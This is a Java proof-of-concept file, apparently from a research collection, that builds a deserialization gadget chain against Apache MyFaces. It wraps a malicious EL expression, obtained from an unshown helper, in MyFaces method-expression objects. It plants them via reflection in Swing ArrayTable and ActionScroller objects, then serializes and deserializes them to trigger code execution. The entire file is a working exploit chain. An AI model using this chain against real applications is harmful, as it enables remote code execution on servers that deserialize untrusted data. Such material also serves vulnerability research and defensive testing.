package com.example.Myface;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ValueExpression;
import javax.swing.event.SwingPropertyChangeSupport;

public class POC_5 {

    /**
     * run with action_equals.jar
     */

    public static void main(String[] args) throws Exception {
        ValueExpression evil = Share.getEvilExpression();
        ValueExpressionMethodExpression expression1 = new ValueExpressionMethodExpression(evil);
        ValueExpressionMethodExpression expression2 = new ValueExpressionMethodExpression(evil);

        Object action = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.plaf.basic.BasicSliderUI$ActionScroller"));
        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{"key", expression1, "key", expression2};

        ReflectionUtil.setField(arrayTable, "table", table);
        SwingPropertyChangeSupport changeSupport = new SwingPropertyChangeSupport("bean");
        ReflectionUtil.setField(action, "arrayTable", arrayTable);
        ReflectionUtil.setField(action, "changeSupport", changeSupport);

        SerializeUtil.deserialize(SerializeUtil.serialize(action));
    }

}
